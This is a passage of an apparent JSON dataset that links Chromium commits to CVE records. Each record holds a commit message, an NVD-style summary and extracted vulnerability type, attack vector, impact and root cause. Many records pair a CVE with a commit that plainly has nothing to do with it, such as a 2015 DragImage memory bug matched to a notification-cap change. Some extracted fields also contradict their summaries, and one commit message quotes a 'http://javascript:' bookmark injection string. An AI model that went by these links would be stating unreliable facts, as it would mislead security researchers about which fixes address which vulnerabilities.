change, it calls\nGetPermissionType even for CONTENT_SETTING_TYPE_MIDI.\n\nBUG=697771\n\nReview-Url: https:\/\/codereview.chromium.org\/2730693002\nCr-Commit-Position: refs\/heads\/master@{#454231}","summary":"Multiple use-after-free vulnerabilities in core\/html\/HTMLInputElement.cpp in the DOM implementation in Blink, as used in Google Chrome before 41.0.2272.76, allow remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger extraneous change events, as demonstrated by events for invalid input or input to read-only fields, related to the initializeTypeInParsing and updateType functions.","commit_message_1":"need to handle midi after the recent permissionmanager 's change , it call getpermissiontype even for content_setting_type_midi","Vulnerability Type":"use - after - free","Attack Vector":"via vectors that trigger extraneous change events , as demonstrated by events for invalid input or input to read - only fields , related to the initializetypeinparsing and updatetype functions .","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within dom","Attack Type":"remote attacker"},{"commit_id":"59512d1ea20d8e85555ecb743ee29ba90016656d","cve_id":"CVE-2015-1227","cwe_id":"CWE-399","commit_message":"NTP: cap number of notifications\/day\n\n1 by default; Finch-configurable.\n\nBUG=689465\n\nReview-Url: https:\/\/codereview.chromium.org\/2691023002\nCr-Commit-Position: refs\/heads\/master@{#450389}","summary":"The DragImage::create function in platform\/DragImage.cpp in Blink, as used in Google Chrome before 41.0.2272.76, does not initialize memory for image drawing, which allows remote attackers to have an unspecified impact by triggering a failed image decoding, as demonstrated by an image for which the default orientation cannot be used.","commit_message_1":"cap number of notifications\/day <number> by default ; finch-configurable","Vulnerability Type":"Resource Management Errors","Attack Vector":"by triggering a failed image decoding , as demonstrated by an image for which the default orientation cannot be used","Impact":"have an unspecified impact","Root Cause":"does not initialize memory for image drawing","Attack Type":"remote attacker"},{"commit_id":"f2dc38825cce54c0b87841a420afbd71453d506b","cve_id":"CVE-2015-1228","cwe_id":"CWE-399","commit_message":"Roll HarfBuzz to 1.4.1\n\nIncludes support for specifying OpenType 1.8 font variations axis\nparameters.\n\nBaseline updates due to expected advance width differences for some\nKhmer combining marks, as well as combining marks placement in\ncombination with ligatures, due to HarfBuzz commit 1a0f4aa6dfee69236b4.\n\nBUG=679305\n\nReview-Url: https:\/\/codereview.chromium.org\/2622553002\nCr-Commit-Position: refs\/heads\/master@{#444707}","summary":"The RenderCounter::updateCounter function in core\/rendering\/RenderCounter.cpp in Blink, as used in Google Chrome before 41.0.2272.76, does not force a relayout operation and consequently does not initialize memory for a data structure, which allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted Cascading Style Sheets (CSS) token sequence.","commit_message_1":"roll harfbuzz to <file>","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted cascading style sheets ( css ) token sequence","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"does not force a relayout operation and consequently does not initialize memory for a data structure","Attack Type":"remote attacker"},{"commit_id":"7933c117fd16b192e70609c331641e9112af5e42","cve_id":"CVE-2015-1229","cwe_id":"CWE-19","commit_message":"Sanitize headers in Proxy Authentication Required responses\n\nBUG=431504\n\nReview URL: https:\/\/codereview.chromium.org\/769043003\n\nCr-Commit-Position: refs\/heads\/master@{#310014}","summary":"net\/http\/proxy_client_socket.cc in Google Chrome before 41.0.2272.76 does not properly handle a 407 (aka Proxy Authentication Required) HTTP status code accompanied by a Set-Cookie header, which allows remote proxy servers to conduct cookie-injection attacks via a crafted response.","commit_message_1":"sanitize header in proxy authentication required response bug=<number> review url : http : \/\/<file>","Vulnerability Type":"Data Processing Errors","Attack Vector":"via a crafted response","Impact":"conduct cookie - injection attacks","Root Cause":"does not properly handle a 407 ( aka proxy authentication required ) http status code accompanied by a set - cookie header ,","Attack Type":"remote attacker"},{"commit_id":"051023a269e548c5da19246c7db6e9870dac2f69","cve_id":"CVE-2015-1303","cwe_id":"CWE-20","commit_message":"Rethrow cross-site exceptions as security errors\n\nBUG=530301\nR=epertoso@chromium.org,haraken@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/1339023002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@202211 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"bindings\/core\/v8\/V8DOMWrapper.h in Blink, as used in Google Chrome before 45.0.2454.101, does not perform a rethrow action to propagate information about a cross-context exception, which allows remote attackers to bypass the Same Origin Policy via a crafted HTML document containing an IFRAME element.","commit_message_1":"rethrow cross-site exception a security error bug=<number> review url : http : \/\/<file>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html document containing an iframe element","Impact":"bypass the same origin policy","Root Cause":"does not perform a rethrow action to propagate information about a cross - context exception","Attack Type":"remote attacker"},{"commit_id":"31b81d4cf8b6a063391839816c82fc61c8272e53","cve_id":"CVE-2015-1233","cwe_id":"CWE-17","commit_message":"Avoid Showing rotation change notification when source is accelerometer\n\nBUG=717252\nTEST=Manually rotate device with accelerometer and observe there's no notification\n\nReview-Url: https:\/\/codereview.chromium.org\/2853113005\nCr-Commit-Position: refs\/heads\/master@{#469058}","summary":"Google Chrome before 41.0.2272.118 does not properly handle the interaction of IPC, the Gamepad API, and Google V8, which allows remote attackers to execute arbitrary code via unspecified vectors.","commit_message_1":"avoid showing rotation change notification when source is accelerometer","Vulnerability Type":"DEPRECATED: Code","Attack Vector":"via unspecified vectors","Impact":"execute arbitrary code","Root Cause":"does not properly handle the interaction of ipc , the gamepad api , and google v8","Attack Type":"remote attacker"},{"commit_id":"6d067124e87295721c62a77f0610e4b37f6098ad","cve_id":"CVE-2015-1210","cwe_id":null,"commit_message":"Use correct context when throwing an exception\n\nBUG=453979\nR=dcarney@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/895553002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@189325 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The V8ThrowException::createDOMException function in bindings\/core\/v8\/V8ThrowException.cpp in the V8 bindings in Blink, as used in Google Chrome before 40.0.2214.111 on Windows, OS X, and Linux and before 40.0.2214.109 on Android, does not properly consider frame access restrictions during the throwing of an exception, which allows remote attackers to bypass the Same Origin Policy via a crafted web site.","commit_message_1":"use correct context when throwing an exception bug=<number> review url : http : \/\/<file>","Vulnerability Type":"Insufficient Information","Attack Vector":"via a crafted web site","Impact":"bypass the Same Origin Policy","Root Cause":"An unspecified error","Attack Type":"remote attacker"},{"commit_id":"0c08ed56a3e5089b3cc4094e83daae196a6300c4","cve_id":"CVE-2015-1212","cwe_id":null,"commit_message":"[Presentation API] Add layout test for connection.close() and fix test failures\n\nAdd layout test.\n\n1-UA connection.close() hits NOTREACHED() in PresentationConnection::didChangeState(). Use PresentationConnection::didClose() instead.\n\nBUG=697719\n\nReview-Url: https:\/\/codereview.chromium.org\/2730123003\nCr-Commit-Position: refs\/heads\/master@{#455225}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 40.0.2214.111 on Windows, OS X, and Linux and before 40.0.2214.109 on Android allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"add layout test for <file> ( ) and fix test failure add layout test","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"c3957448cfc6e299165196a33cd954b790875fdb","cve_id":"CVE-2016-5170","cwe_id":"CWE-416","commit_message":"Cleanup and remove dead code in SetFocusedElement\n\nThis early-out was added in:\n\nhttps:\/\/crrev.com\/ce8ea3446283965c7eabab592cbffe223b1cf2bc\n\nBack then, we applied fragment focus in LayoutUpdated() which could\ncause this issue. This got cleaned up in:\n\nhttps:\/\/crrev.com\/45236fd563e9df53dc45579be1f3d0b4784885a2\n\nso that focus is no longer applied after layout.\n\n+Cleanup: Goto considered harmful\n\nBug: 795381\nChange-Id: Ifeb4d2e03e872fd48cca6720b1d4de36ad1ecbb7\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1524417\nCommit-Queue: David Bokan <bokan@chromium.org>\nReviewed-by: Stefan Zager <szager@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#641101}","summary":"WebKit\/Source\/bindings\/modules\/v8\/V8BindingForModules.cpp in Blink, as used in Google Chrome before 53.0.2785.113, does not properly consider getter side effects during array key conversion, which allows remote attackers to cause a denial of service (use-after-free) or possibly have unspecified other impact via crafted Indexed Database (aka IndexedDB) API calls.","commit_message_1":"cleanup and remove dead code in setfocusedelement this early-out wa added in : http : \/\/<file>\/ce8ea3446283965c7eabab592cbffe223b1cf2bc back then , we applied fragment focus in layoutupdated ( ) which could cause this issue","Vulnerability Type":"Use After Free","Attack Vector":"via crafted indexed database ( aka indexeddb ) api calls","Impact":"cause a denial of service ( use - after - free ) or possibly have unspecified other impact","Root Cause":"does not properly consider getter side effects during array key conversion","Attack Type":"remote attacker"},{"commit_id":"9fbe5ca8091b6b42b0fe770ed088cdcf6ef144b7","cve_id":"CVE-2016-5175","cwe_id":null,"commit_message":"[BGPT] Correctly set scrolls_outer_viewport bit\n\nI noticed in debugging that the scroll tree never had an outer viewport.\nSome investigation shows that we never hooked up the bit to the root\nscroller.\n\nSure enough, before this CL, we don't perform the URL bar adjustment\ncorrectly. This CL sets the bit based on the root scroller and fixes the\nissue. Also added the scrolls_inner|outer_viewport bits to the debugging\noutput to make this easier to see.\n\nBug: 947879\nChange-Id: I5a450aa2642a64f8db004c97c0e744d196e91009\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1546540\nReviewed-by: Philip Rogers <pdr@chromium.org>\nCommit-Queue: David Bokan <bokan@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#646394}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 53.0.2785.113 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"correctly set scrolls_outer_viewport bit i noticed in debugging that the scroll tree never had an outer viewport","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"5472db1c7eca35822219d03be5c817d9a9258c11","cve_id":"CVE-2016-5147","cwe_id":"CWE-79","commit_message":"Always call UpdateCompositedScrollOffset, not just for the root layer\n\nBug: 927560\nChange-Id: I1d5522aae4f11dd3f5b8947bb089bac1bf19bdb4\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1452701\nReviewed-by: Chris Harrelson <chrishtr@chromium.org>\nCommit-Queue: Mason Freed <masonfreed@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#628942}","summary":"Blink, as used in Google Chrome before 53.0.2785.89 on Windows and OS X and before 53.0.2785.92 on Linux, mishandles deferred page loads, which allows remote attackers to inject arbitrary web script or HTML via a crafted web site, aka *Universal XSS (UXSS).*","commit_message_1":"always call updatecompositedscrolloffset , not just for the root layer","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via a crafted web site , aka * universal xss ( uxss )","Impact":"inject arbitrary web script or html","Root Cause":"caused by improper validation of user-supplied input related to an error","Attack Type":"remote attacker"},{"commit_id":"47ae3dfdee9a0796a079cd4eadf2f75b34f257ae","cve_id":"CVE-2016-5152","cwe_id":"CWE-190","commit_message":"Fix memory leak in ChooserContextBase::GetGrantedObjects.\n\nBug: 854329\nChange-Id: Ia163d503a4207859cd41c847c9d5f67e77580fbc\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1456080\nReviewed-by: Balazs Engedy <engedy@chromium.org>\nReviewed-by: Raymes Khoury <raymes@chromium.org>\nCommit-Queue: Marek Haranczyk <mharanczyk@opera.com>\nCr-Commit-Position: refs\/heads\/master@{#629919}","summary":"Integer overflow in the opj_tcd_get_decoded_tile_size function in tcd.c in OpenJPEG, as used in PDFium in Google Chrome before 53.0.2785.89 on Windows and OS X and before 53.0.2785.92 on Linux, allows remote attackers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact via crafted JPEG 2000 data.","commit_message_1":"fix memory leak in choosercontextbase : :getgrantedobjects","Vulnerability Type":"integer overflow","Attack Vector":"via crafted jpeg 2000 data","Impact":"cause a denial of service ( heap - based buffer overflow ) or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by PDFium","Attack Type":"remote attacker"},{"commit_id":"20a9e39a925dd0fb183acb61bb7b87f29abea83f","cve_id":"CVE-2016-5153","cwe_id":"CWE-19","commit_message":"Tracing: Connect to service on startup\n\nTemporary workaround for flaky tests introduced by\nhttps:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1439082\n\nTBR=eseckler@chromium.org\n\nBug: 928410, 928363\nChange-Id: I0dcf20cbdf91a7beea167a220ba9ef7e0604c1ab\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1452767\nReviewed-by: oysteine <oysteine@chromium.org>\nReviewed-by: Eric Seckler <eseckler@chromium.org>\nReviewed-by: Aaron Gable <agable@chromium.org>\nCommit-Queue: oysteine <oysteine@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#631052}","summary":"The Web Animations implementation in Blink, as used in Google Chrome before 53.0.2785.89 on Windows and OS X and before 53.0.2785.92 on Linux, improperly relies on list iteration, which allows remote attackers to cause a denial of service (use-after-destruction) or possibly have unspecified other impact via a crafted web site.","commit_message_1":"connect to service on startup temporary workaround for flaky test introduced by http : \/\/chromium-<file>","Vulnerability Type":"Data Processing Errors","Attack Vector":"via a crafted web site","Impact":"execute arbitrary code","Root Cause":"caused by a use-after-destruction","Attack Type":"remote attacker"},{"commit_id":"32a9879fc01c24f9216bb2975200ab8a4afac80c","cve_id":"CVE-2016-5155","cwe_id":"CWE-254","commit_message":"Prefer SyncService over ProfileSyncService in foreign_session_helper\n\nSyncService is the interface, ProfileSyncService is the concrete\nimplementation. Generally no clients should need to use the conrete\nimplementation - for one, testing will be much easier once everyone\nuses the interface only.\n\nBug: 924508\nChange-Id: Ia210665f8f02512053d1a60d627dea0f22758387\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1461119\nAuto-Submit: Marc Treib <treib@chromium.org>\nCommit-Queue: Yaron Friedman <yfriedman@chromium.org>\nReviewed-by: Yaron Friedman <yfriedman@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#630662}","summary":"Google Chrome before 53.0.2785.89 on Windows and OS X and before 53.0.2785.92 on Linux does not properly validate access to the initial document, which allows remote attackers to spoof the address bar via a crafted web site.","commit_message_1":"prefer syncservice over profilesyncservice in foreign_session_helper syncservice is the interface , profilesyncservice is the concrete implementation","Vulnerability Type":"Security Features","Attack Vector":"via a crafted web site","Impact":"spoof the address bar","Root Cause":"does not properly validate access to the initial document ","Attack Type":"remote attacker"},{"commit_id":"ba011d9f8322c62633a069a59c2c5525e3ff46cc","cve_id":"CVE-2016-5156","cwe_id":"CWE-416","commit_message":"Ignore filtered event if an event matcher cannot be added.\n\nBUG=625404\n\nReview-Url: https:\/\/codereview.chromium.org\/2236133002\nCr-Commit-Position: refs\/heads\/master@{#411472}","summary":"extensions\/renderer\/event_bindings.cc in the event bindings in Google Chrome before 53.0.2785.89 on Windows and OS X and before 53.0.2785.92 on Linux attempts to process filtered events after failure to add an event matcher, which allows remote attackers to cause a denial of service (use-after-free) or possibly have unspecified other impact via unknown vectors.","commit_message_1":"ignore filtered event if an event matcher can not be added","Vulnerability Type":"Use After Free","Attack Vector":"via unknown vectors","Impact":"cause a denial of service ( use - after - free ) or possibly have unspecified other impact","Root Cause":"add an event matcher","Attack Type":"remote attacker"},{"commit_id":"6a310d99a741f9ba5e4e537c5ec49d3adbe5876f","cve_id":"CVE-2016-5158","cwe_id":"CWE-190","commit_message":"Position info (item n of m) incorrect if hidden focusable items in list\n\nBug: 836997\nChange-Id: I971fa7076f72d51829b36af8e379260d48ca25ec\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1450235\nCommit-Queue: Aaron Leventhal <aleventhal@chromium.org>\nReviewed-by: Nektarios Paisios <nektar@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#628890}","summary":"Multiple integer overflows in the opj_tcd_init_tile function in tcd.c in OpenJPEG, as used in PDFium in Google Chrome before 53.0.2785.89 on Windows and OS X and before 53.0.2785.92 on Linux, allow remote attackers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact via crafted JPEG 2000 data.","commit_message_1":"position info ( item n of m ) incorrect if hidden focusable item in list","Vulnerability Type":"integer overflow","Attack Vector":"via crafted jpeg 2000 data ","Impact":"cause a denial of service ( heap - based buffer overflow ) or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by PDFium","Attack Type":"remote attacker"},{"commit_id":"93bc623489bdcfc7e9127614fcfb3258edf3f0f9","cve_id":"CVE-2016-5164","cwe_id":"CWE-79","commit_message":"[DevTools] Copy objects from debugger context to inspected context properly.\n\nBUG=637594\n\nReview-Url: https:\/\/codereview.chromium.org\/2253643002\nCr-Commit-Position: refs\/heads\/master@{#412436}","summary":"Cross-site scripting (XSS) vulnerability in WebKit\/Source\/platform\/v8_inspector\/V8Debugger.cpp in Blink, as used in Google Chrome before 53.0.2785.89 on Windows and OS X and before 53.0.2785.92 on Linux, allows remote attackers to inject arbitrary web script or HTML into the Developer Tools (aka DevTools) subsystem via a crafted web site, aka *Universal XSS (UXSS).*","commit_message_1":"copy object from debugger context to inspected context properly","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via a crafted web site , aka * universal xss ( uxss ) ","Impact":"inject arbitrary web script or html into the developer tools ( aka devtools ) subsystem","Root Cause":"caused by improper validation of user-supplied input using DevTools","Attack Type":"remote attacker"},{"commit_id":"19b8593007150b9a78da7d13f6e5f8feb10881a7","cve_id":"CVE-2016-5165","cwe_id":"CWE-79","commit_message":"Add CPU metrics provider and Add CPU\/GPU provider for UKM.\n\nBug: 907674\nChange-Id: I61b88aeac8d2a7ff81d812fa5a267f48203ec7e2\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1381376\nCommit-Queue: Nik Bhagat <nikunjb@chromium.org>\nReviewed-by: Robert Kaplow <rkaplow@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#618037}","summary":"Cross-site scripting (XSS) vulnerability in the Developer Tools (aka DevTools) subsystem in Google Chrome before 53.0.2785.89 on Windows and OS X and before 53.0.2785.92 on Linux allows remote attackers to inject arbitrary web script or HTML via the settings parameter in a chrome-devtools-frontend.appspot.com URL's query string.","commit_message_1":"add cpu metric provider and add cpu\/gpu provider for ukm","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via the settings parameter in a chrome - devtools - frontend . appspot . com url ' s query string","Impact":"inject arbitrary web script or html","Root Cause":"caused by improper validation of user-supplied input using DevTools","Attack Type":"remote attacker"},{"commit_id":"89f296b34f4f33e048848c06da08fc9271b30bc9","cve_id":"CVE-2016-5182","cwe_id":"CWE-119","commit_message":"[AF] Prevent Logging Password Values to Console\n\nBefore sending over to be logged by DevTools, filter out DOM nodes that\nhave a type attribute equal to \"password\", and that are not empty.\n\nBug: 934609\nChange-Id: I147ad0c2bad13cc50394f4b5ff2f4bfb7293114b\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1506498\nCommit-Queue: Sebastien Lalancette <seblalancette@chromium.org>\nReviewed-by: Vadym Doroshenko <dvadym@chromium.org>\nReviewed-by: Mathieu Perreault <mathp@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#638615}","summary":"Blink in Google Chrome prior to 54.0.2840.59 for Windows, Mac, and Linux; 54.0.2840.85 for Android had insufficient validation in bitmap handling, which allowed a remote attacker to potentially exploit heap corruption via crafted HTML pages.","commit_message_1":"prevent logging password value to console before sending over to be logged by devtools , filter out dom node that have a type attribute equal to `` password '' , and that are not empty","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted html pages","Impact":"potentially exploit heap corruption","Root Cause":"had insufficient validation","Attack Type":"remote attacker"},{"commit_id":"8cfe2463cec6835c7b0b73dcb2ab2edaf035e3f9","cve_id":"CVE-2016-5183","cwe_id":"CWE-416","commit_message":"Refactor the AppController implementation into a KeyedService.\n\nThis is necessary to guarantee that the AppController will not outlive\nthe AppServiceProxy, which could happen before during Profile destruction.\n\nBug: 945427\nChange-Id: I9e2089799e38d5a70a4a9aa66df5319113e7809e\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1542336\nReviewed-by: Michael Giuffrida <michaelpg@chromium.org>\nCommit-Queue: Lucas Ten\u00f3rio <ltenorio@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#645122}","summary":"A heap use after free in PDFium in Google Chrome prior to 54.0.2840.59 for Windows, Mac, and Linux; 54.0.2840.85 for Android allows a remote attacker to potentially exploit heap corruption via crafted PDF files.","commit_message_1":"refactor the appcontroller implementation into a keyedservice","Vulnerability Type":"Use After Free","Attack Vector":"via crafted pdf files","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"f2d26633cbd50735ac2af30436888b71ac0abad3","cve_id":"CVE-2016-5185","cwe_id":"CWE-416","commit_message":"[Autofill] Remove AutofillPopupViewViews and associated feature.\n\nBug: 906135,831603\nChange-Id: I3c982f8b3ffb4928c7c878e74e10113999106499\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1387124\nReviewed-by: Robert Kaplow <rkaplow@chromium.org>\nReviewed-by: Vasilii Sukhanov <vasilii@chromium.org>\nReviewed-by: Fabio Tirelo <ftirelo@chromium.org>\nReviewed-by: Tommy Martino <tmartino@chromium.org>\nCommit-Queue: Mathieu Perreault <mathp@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#621360}","summary":"Blink in Google Chrome prior to 54.0.2840.59 for Windows, Mac, and Linux; 54.0.2840.85 for Android incorrectly allowed reentrance of FrameView::updateLifecyclePhasesInternal(), which allowed a remote attacker to perform an out of bounds memory read via crafted HTML pages.","commit_message_1":"remove autofillpopupviewviews and associated feature","Vulnerability Type":"Use After Free","Attack Vector":"via crafted html pages","Impact":"perform an out of bounds memory read","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"4e4c9b553ae124ed9bb60356e2ecff9106abddd0","cve_id":"CVE-2016-5187","cwe_id":"CWE-20","commit_message":"Convert Uses of base::RepeatingCallback<>::Equals to Use == or != in \/\/base\n\nStaging this change because some conversions will have semantic changes.\n\nBUG=937566\n\nChange-Id: I2d4950624c0fab00e107814421a161e43da965cc\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1507245\nReviewed-by: Gabriel Charette <gab@chromium.org>\nCommit-Queue: Gabriel Charette <gab@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#639702}","summary":"Google Chrome prior to 54.0.2840.85 for Android incorrectly handled rapid transition into and out of full screen mode, which allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via crafted HTML pages.","commit_message_1":"to use == or ! = in \/\/base staging this change because some conversion will have semantic change","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted html pages","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"handled rapid transition into and out of full screen mode","Attack Type":"remote attacker"},{"commit_id":"e99cc8e5a48ff4978d401c48a64f06649f647f3f","cve_id":"CVE-2016-5192","cwe_id":"CWE-284","commit_message":"Check CORS policy on redirect in TextTrackLoader\n\nBUG=633885\nTEST=new case in http\/tests\/security\/text-track-crossorigin.html\n\nReview-Url: https:\/\/codereview.chromium.org\/2367583002\nCr-Commit-Position: refs\/heads\/master@{#421919}","summary":"Blink in Google Chrome prior to 54.0.2840.59 for Windows missed a CORS check on redirect in TextTrackLoader, which allowed a remote attacker to bypass cross-origin restrictions via crafted HTML pages.","commit_message_1":"check cors policy on redirect in texttrackloader","Vulnerability Type":"Improper Access Control","Attack Vector":"via crafted html pages","Impact":"bypass cross - origin restrictions","Root Cause":"caused by an error related to Blink","Attack Type":"remote attacker"},{"commit_id":"2440e872debd68ae7c2a8bf9ddb34df2cce378cd","cve_id":"CVE-2016-5189","cwe_id":"CWE-284","commit_message":"[GCPW] Disallow sign in of consumer accounts when mdm is enabled.\n\nUnless the registry key \"mdm_aca\" is explicitly set to 1, always\nfail sign in of consumer accounts when mdm enrollment is enabled.\n\nConsumer accounts are defined as accounts with gmail.com or\ngooglemail.com domain.\n\nBug: 944049\nChange-Id: Icb822f3737d90931de16a8d3317616dd2b159edd\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1532903\nCommit-Queue: Tien Mai <tienmai@chromium.org>\nReviewed-by: Roger Tawa <rogerta@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#646278}","summary":"Google Chrome prior to 54.0.2840.59 for Windows, Mac, and Linux; 54.0.2840.85 for Android permitted navigation to blob URLs with non-canonical origins, which allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via crafted HTML pages.","commit_message_1":"disallow sign in of consumer account when mdm is enabled","Vulnerability Type":"Improper Access Control","Attack Vector":"via crafted html pages","Impact":"conduct spoofing attacks","Root Cause":"navigation to blob urls with non - canonical origins","Attack Type":"remote attacker"},{"commit_id":"fa34e547d6ee25ea0692436ba7462ed0a0ef45f4","cve_id":"CVE-2016-5191","cwe_id":"CWE-79","commit_message":"Prevent interpretating userinfo as url scheme when editing bookmarks\n\nChrome's Edit Bookmark dialog formats urls for display such that a\nurl of http:\/\/javascript:scripttext@host.com is later converted to a\njavascript url scheme, allowing persistence of a script injection\nattack within the user's bookmarks.\n\nThis fix prevents such misinterpretations by always showing the\nscheme when a userinfo component is present within the url.\n\nBUG=639126\n\nReview-Url: https:\/\/codereview.chromium.org\/2368593002\nCr-Commit-Position: refs\/heads\/master@{#422467}","summary":"Bookmark handling in Google Chrome prior to 54.0.2840.59 for Windows, Mac, and Linux; 54.0.2840.85 for Android had insufficient validation of supplied data, which allowed a remote attacker to inject arbitrary scripts or HTML (UXSS) via crafted HTML pages, as demonstrated by an interpretation conflict between userinfo and scheme in an http:\/\/javascript:","commit_message_1":"prevent interpretating userinfo a url scheme when editing bookmark chrome 's edit bookmark dialog format url for display such that a url of http : \/\/javascript : scripttext @ <file> is later converted to a javascript url scheme , allowing persistence of a script injection attack within the user 's bookmark","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via crafted html pages , as demonstrated by an interpretation conflict between userinfo and scheme in an http : \/ \/ javascript","Impact":"inject arbitrary scripts or html ( uxss )","Root Cause":"caused by improper validation of user-supplied input by Bookmarks","Attack Type":"remote attacker"},{"commit_id":"4afb628e068367d5b73440537555902cd12416f8","cve_id":"CVE-2016-1705","cwe_id":null,"commit_message":"gpu\/android : Add support for partial swap with surface control.\n\nAdd support for PostSubBuffer to GLSurfaceEGLSurfaceControl. This should\nallow the display compositor to draw the minimum sub-rect necessary from\nthe damage tracking in BufferQueue on the client-side, and also to pass\nthis damage rect to the framework.\n\nR=piman@chromium.org\n\nBug: 926020\nChange-Id: I73d3320cab68250d4c6865bf21c5531682d8bf61\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1457467\nCommit-Queue: Khushal <khushalsagar@chromium.org>\nCommit-Queue: Antoine Labour <piman@chromium.org>\nReviewed-by: Antoine Labour <piman@chromium.org>\nAuto-Submit: Khushal <khushalsagar@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#629852}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 52.0.2743.82 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"add support for partial swap with surface control","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"84fbaf8414b4911ef122557d1518b50f79c2eaef","cve_id":"CVE-2016-1646","cwe_id":"CWE-119","commit_message":"OomIntervention opt-out should work properly with 'show original'\n\nOomIntervention should not be re-triggered on the same page if the user declines the intervention once.\nThis CL fixes the bug.\n\nBug: 889131, 887119\nChange-Id: Idb9eebb2bb9f79756b63f0e010fe018ba5c490e8\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1245019\nCommit-Queue: Yuzu Saijo <yuzus@chromium.org>\nReviewed-by: Kentaro Hara <haraken@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#594574}","summary":"The Array.prototype.concat implementation in builtins.cc in Google V8, as used in Google Chrome before 49.0.2623.108, does not properly consider element data types, which allows remote attackers to cause a denial of service (out-of-bounds read) or possibly have unspecified other impact via crafted JavaScript code.","commit_message_1":"oomintervention opt-out should work properly with 'show original' oomintervention should not be re-triggered on the same page if the user decline the intervention once","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted javascript code","Impact":"cause a denial of service ( out - of - bounds read ) or possibly have unspecified other impact","Root Cause":"does not properly consider element data types","Attack Type":"remote attacker"},{"commit_id":"e5787005a9004d7be289cc649c6ae4f3051996cd","cve_id":"CVE-2016-1647","cwe_id":null,"commit_message":"Check that RWHI isn't deleted manually while owned by a scoped_ptr in RVHI\n\nBUG=590284\n\nReview URL: https:\/\/codereview.chromium.org\/1747183002\n\nCr-Commit-Position: refs\/heads\/master@{#378844}","summary":"Use-after-free vulnerability in the RenderWidgetHostImpl::Destroy function in content\/browser\/renderer_host\/render_widget_host_impl.cc in the Navigation implementation in Google Chrome before 49.0.2623.108 allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"check that rwhi is n't deleted manually while owned by a scoped_ptr in rvhi bug=<number> review url : http : \/\/<file>","Vulnerability Type":"use - after - free","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"remote 